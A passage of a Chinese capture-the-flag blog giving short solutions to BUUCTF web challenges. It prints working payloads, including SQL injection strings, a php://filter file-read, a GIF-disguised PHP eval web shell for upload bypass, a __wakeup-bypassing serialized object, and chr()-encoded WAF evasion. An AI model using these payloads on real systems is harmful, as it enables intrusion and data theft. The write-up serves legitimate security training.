class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]<span class=\"operator\">=</span><span class=\"operator\">&gt;</span></span><br><span class=\"line\">  string(<span class=\"number\">1</span>) &quot;1&quot;</span><br><span class=\"line\">  [<span class=\"number\">1</span>]<span class=\"operator\">=</span><span class=\"operator\">&gt;</span></span><br><span class=\"line\">  string(<span class=\"number\">7</span>) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从网上抄的 <code>1&#39; or &#39;1&#39;=&#39;1</code> 不管用，有空再回来补。</p>\n<h3 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h3><p>抄的 wp：<code>*,1</code>，也不懂，有空补。</p>\n<h3 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret File\"></a>[极客大挑战 2019]Secret File</h3><p>F12 看到</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;master&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;./Archive_room.php&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;</span>Oh! You found me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>转到 <code>Archive_room.php</code>，有一个按钮指向 <code>action.php</code>，点了之后是一个 302 后的 <code>end.php</code>。应该是跳到 <code>action.php</code> 然后光速重定向到 <code>end.php</code>，所以没看到 <code>action.php</code> 的内容。<br>用 burpsuite 抓包，发现 <code>action.php</code> 有个 <code>secr3t.php</code>，进去后是以下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;../&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&quot;tp&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;input&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;data&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Oh no!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>); </span><br><span class=\"line\"><span class=\"comment\">//flag放在了flag.php里</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这时候要用 php 伪协议读取 <code>flag.php</code>，<code>php://filter</code> 是 php 伪协议，<code>read=convert.base64-encode/resource=</code> 是 base64 编码，<code>flag.php</code> 是要读取的文件，所以这里的 payload 是 <code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code>，然后把返回的 base64 解码就行了。</p>\n<h3 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h3><p>找到藏着的标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border:none;cursor:default;&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;return false&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>转到 <code>Secret.php</code>，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">GET</span> <span class=\"string\">/Secret.php</span> <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attr\">Host:</span> <span class=\"string\">node4.buuoj.cn:25539</span></span><br><span class=\"line\"><span class=\"attr\">Upgrade-Insecure-Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">User-Agent:</span> <span class=\"string\">&quot;Syclover&quot;</span> <span class=\"string\">browser</span></span><br><span class=\"line\"><span class=\"attr\">Accept:</span> <span class=\"string\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Encoding:</span> <span class=\"string\">gzip,</span> <span class=\"string\">deflate</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Language:</span> <span class=\"string\">zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"attr\">Connection:</span> <span class=\"string\">close</span></span><br><span class=\"line\"><span class=\"attr\">Referer:</span> <span class=\"string\">https://Sycsecret.buuoj.cn</span></span><br><span class=\"line\"><span class=\"attr\">X-Forwarded-For:</span> <span class=\"string\">localhost</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h3><p>蚁剑连上秒了。</p>\n<h3 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h3><p>考文件上传，只能上传图片，还过滤了 <code>&lt;?</code>，新建一个文件写如下内容：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a? <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;php&quot;</span>&gt;</span><span class=\"language-javascript\"><span class=\"built_in\">eval</span>($_REQUEST[<span class=\"string\">&#x27;a&#x27;</span>])</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后后缀改成 <code>.jpg</code>，上传成功，然后在 burpsuite 把后缀改成 <code>.phtml</code> 重发一遍，文件存在了 <code>/upload</code> 文件夹，用蚁剑连上去就行了。<br>或者上传 <code>.phtml</code>先，这时上传是失败的的，bp 抓包把 <code>Content-Type</code> 改成 <code>image/jpeg</code> 重发一遍就行了。</p>\n<h3 id=\"ACTF2020-新生赛-Upload\"><a href=\"#ACTF2020-新生赛-Upload\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Upload\"></a>[ACTF2020 新生赛]Upload</h3><p>和上面的差不多，前端验证后缀，上传个 <code>.jpg</code> 然后 bp 改下后缀重发就行。</p>\n<h3 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h3><p>又是 SQL 注入，跳过。</p>\n<h3 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h3><p>盲猜有个 <code>www.zip</code>，下载下来看到 <code>unserialize</code>，反序列化的题。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>反序列化时会首先执行 <code>__wakeup</code>，然后执行 <code>__destruct</code>，但是 <code>__wakeup</code> 里把 <code>username</code> 改成了 <code>guest</code>，所以 <code>__destruct</code> 里的 <code>if ($this-&gt;username === &#39;admin&#39;)</code> 正常情况下永远不会成立，所以这里要绕过 <code>__wakeup</code>，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 <code>__wakeup</code>，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>(<span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>出来一个 <code>O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code>，urlencode 前是 <code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>，所以把 2 改成 3 就行，最终的 payload 就是 <code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>\n<h3 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h3><p>wp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。<br>总之就是有个 <code>index.php.bak</code>，内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$key</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>php 里的 <code>==</code> 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 <code>str</code> 就只取 <code>123</code>，所以这里的 payload 是 <code>?key=123</code>。</p>\n<h3 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h3><p>F12 看到说 <code>I&#39;ve set up WAF to ensure security.</code>，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 <code>calc.php</code> 去。直接访问 <code>calc.php</code>，内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>,<span class=\"string\">&#x27;\\$&#x27;</span>,<span class=\"string\">&#x27;\\\\&#x27;</span>,<span class=\"string\">&#x27;\\^&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$str</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;what are you want to do?&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span>.<span class=\"variable\">$str</span>.<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后发现 num 里面有字母时也会被 WAF 拦下来，比如 <code>?num=a</code> 时就不行，这时候就有个骚操作，可以在 <code>num</code> 前面加个空格或者 <code>+</code>，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 <code>+</code> 去掉。<br>那么我们 <code>? num=var_dump(scandir(chr(47)))</code> 看下目录内容，为了绕过黑名单只能用 ASCII码，<code>chr(47)</code> 就是 <code>/</code>，也就是相当于 <code>ls /</code>，看到有个 <code>f1agg</code>，用 <code>file_get_contents</code> 读出来就行，payload 为 <code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>。</p>\n<h3 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h3><p>MENU 跳到 <code>pay.php</code>，F12 看到源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">elseif</span> (<span class=\"variable\">$password</span> == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 <code>404a</code> 传过去，发现没反应，根据他的要求再 POST 个 <code>money</code> 过去，还是没反应，看 wp 才发现有个 <code>user</code> 的 cookie 要改成 1，这时有反应了，说 <code>money</code> 太长。<br>PHP 5.3 有个关于 <code>strcmp</code> 的漏洞，就是数据类型不同的时候，<code>strcmp</code> 会返回 0，所以这里的 payload 是 <code>?password=404a&amp;money[]=1</code>，就是把 <code>money</code> 干成数组，就得到 flag了。</p>\n<h3 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h3><p>随便输个 <code>1</code>，一看响应头有个 hint：<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code>，好，那就搞搞 MD5。<br>首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 <code>md5</code> 函数后面的 <code>true</code> 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 <code>str(long_to_bytes())</code>。<br>wp 中选择了 <code>ffifdyop</code> 作为 payload，其 MD5 值为 <code>276f722736c95d99e921722cf9ed621c</code>，前面的 <code>27 6f 72 27 36</code> 对应的字符为 <code>&#39;or&#39;6</code>，这样就可以进行一个 SQL 注入，拼凑出 <code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6...&#39;</code>，后面还会跟着一堆乱码，但是 <code>6...</code> 会被当成数字，所以就一定为真。<br>然后跳到了 <code>levels91.php</code>，F12 看到：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$a</span> != <span class=\"variable\">$b</span> &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>\n\n<p><code>$GET</code> 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 <code>0e</code> 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 <code>0</code>，比如 <code>QNKCDZO</code> 和 <code>s878926199a</code>，传参进去后出现如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>]!==<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]&amp;&amp;<span class=\"title function_ invoke__\">md5</span>(<span 